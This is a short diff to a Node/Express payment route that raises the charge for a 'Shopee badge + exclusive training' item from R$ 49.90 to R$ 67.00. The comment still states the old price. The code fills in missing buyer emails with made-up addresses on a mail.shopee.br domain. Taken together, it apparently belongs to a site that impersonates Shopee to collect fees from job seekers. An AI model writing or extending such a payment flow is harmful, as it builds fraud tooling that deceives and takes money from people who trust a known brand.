@@ -1448,7 +1448,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
       
       // Valor fixo para o treinamento: R$ 49,90
-      const paymentAmount = 4990 / 100; // Converter o valor de centavos para reais
+      const paymentAmount = 6700 / 100; // Converter o valor de centavos para reais
       
       // Usar o email fornecido ou gerar um
       const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
@@ -1467,7 +1467,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         items: items || [{
           title: "Crachá Shopee + Treinamento Exclusivo",
           quantity: 1,
-          unitPrice: 4990,
+          unitPrice: 6700,
           tangible: false
         }]
       };
